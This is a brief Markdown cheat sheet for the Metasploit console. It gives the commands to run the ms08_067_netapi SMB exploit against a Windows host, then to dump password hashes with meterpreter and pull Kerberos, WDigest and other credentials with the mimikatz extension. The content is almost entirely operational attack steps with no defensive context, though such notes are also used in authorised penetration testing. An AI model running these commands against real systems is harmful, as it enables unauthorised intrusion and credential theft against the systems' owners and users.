## msfconsole (msf | metaspolit)

#### Search

##### Search for SMB Exploits on Windows
`msf > search exploit/windows/smb`

#### Options

##### exploit/windows/smb/ms08_067_netapi Options
`msf exploit(ms08_067_netapi) > show options`

#### Attack

##### Attack SMB for Windows
`msf > use exploit/windows/smb/ms08_067_netapi`
`msf exploit(ms08_067_netapi) > set RHOST 10.37.129.9`
`msf exploit(ms08_067_netapi) > set RPORT 445`
`msf exploit(ms08_067_netapi) > exploit`

#### meterpreter

##### help
`meterpreter > help`

##### hashdump
`meterpreter > hashdump`

#### mimikatz

##### load mimikatz
`meterpreter > load mimikatz`

##### options

Command | Description
--- | ---
kerberos | Attempt to retrieve kerberos creds
livessp | Attempt to retrieve livessp creds
mimikatz_command | Run a custom command
msv | Attempt to retrieve msv creds (hashes)
ssp | Attempt to retrieve ssp creds
tspkg | Attempt to retrieve tspkg creds
wdigest | Attempt to retrieve wdigest creds